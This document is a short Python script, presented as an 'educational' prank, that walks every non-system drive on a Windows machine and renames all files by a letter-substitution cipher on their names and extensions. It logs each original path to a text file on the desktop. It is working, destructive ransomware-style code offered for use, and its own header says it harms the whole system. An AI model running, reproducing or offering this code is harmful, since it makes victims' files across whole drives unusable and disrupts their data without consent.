'''
    
    **********        O N L Y     F O R      E D U C A T I O N A L        P U R P O S E       ***********

    This python program is a fun program ONLY FOR EDUCATIONAL PURPOSE and prank. 
    This is really really harms the whole system. 
    This change the files name to some other name and the file extension is also altered so that the file cannot be opened until decrypted.
    All the paths traversed is stored in a textfile in desktop.
    USE THIS(OR ENCRYPT) PROGRAM TO BRING BACK THE FILES NORMALLY.
    Use it with caution.!! THIS JUST TAKES AROUND 10 SECONDS TO TRAVERSE A NORMAL PC.
'''




from os import listdir,path,rename
from getpass import getuser 
from random import shuffle
from win32api import GetLogicalDriveStrings

username = getuser()  

def getListOfFiles(dirName):
    try:
        listOfFile = listdir(dirName)    #Getting directory list
        allFiles = list()
                                        # Iterate over all the entries
        for entry in listOfFile:
            if entry=="System Volume Information" or entry=="Programs" or entry=="$RECYCLE.BIN":         #Optional for C: drive
                continue 
            fullPath = path.join(dirName, entry)             # Create full path
            if path.isdir(fullPath):         #If directory the get subfiles
                allFiles = allFiles + getListOfFiles(fullPath)
            else:
                allFiles.append(fullPath)                    
        return allFiles        
    except OSError:
        pass
    return []



drivess1 = GetLogicalDriveStrings()         #Disk drives 
drivess1 = drivess1.split('\000')[:-1]                 #On characters enough
shuffle(drivess1)                             #huffling the drive list
drivess1.remove("C:\\")                              #Removing C drive since permission issues takes place and C contains alot of subfolders

for drives in drivess1:
    dirName1=drives
    listOfFiles = getListOfFiles(dirName1)

    out_file="C:\\Users\\"+username+"\\Desktop\\Tempfile.txt"

    A=""
    B=""
    temp_elem=""
    temp_elem1=""
    elem1=""

    dict_val={"A":"R","B":"U","C":"D","D":"O","E":"K","F":"Y","G":"V","H":"Q","I":"B","J":"C","K":"L","L":"Z","M":"J","N":"F","O":"E","P":"A","Q":"H","R":"S","S":"T","T":"N","U":"M","V":"I","W":"G","X":"P","Y":"W","Z":"X",".":"."}

    #inv_dict_val={v: k for k, v in dict_val.items()}

    for elem in listOfFiles:
        f=open(out_file,"a")
        x=elem.rfind("\\")
        temp_elem=elem
        f.write(temp_elem+"\n")
        f.close()
        elem1=elem[x+1:]
        print(elem1)
        elem1=elem1.upper()
        for p in elem1:
            if p in dict_val:
                A=A+dict_val[p]
            else:
                A=A+p
        A=A.lower()
        print(A)
        temp_elem1=temp_elem[:x]+"\\"+A
        rename(temp_elem,temp_elem1)
        temp_elem1=""
        temp_elem=""
        A=""



